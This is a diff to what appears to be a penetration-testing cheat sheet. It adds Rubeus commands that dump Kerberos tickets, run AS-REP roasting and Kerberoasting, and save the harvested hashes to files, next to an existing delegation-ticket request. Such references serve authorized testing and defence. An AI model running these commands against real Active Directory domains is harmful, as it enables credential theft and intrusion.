@@ -5487,7 +5487,17 @@ srvinfo
 
 #### Rubeus
 
-### Request a Delegation Ticket
+##### Common Commands
+
+```c
+.\Rubeus.exe dump /nowrap
+.\Rubeus.exe asreproast /nowrap
+.\Rubeus.exe asreproast /outfile:hashes.asreproast
+.\Rubeus.exe kerberoast /nowrap
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+```
+
+##### Request a Delegation Ticket
 
 ```c
 .\Rubeus.exe tgtdeleg /nowrap
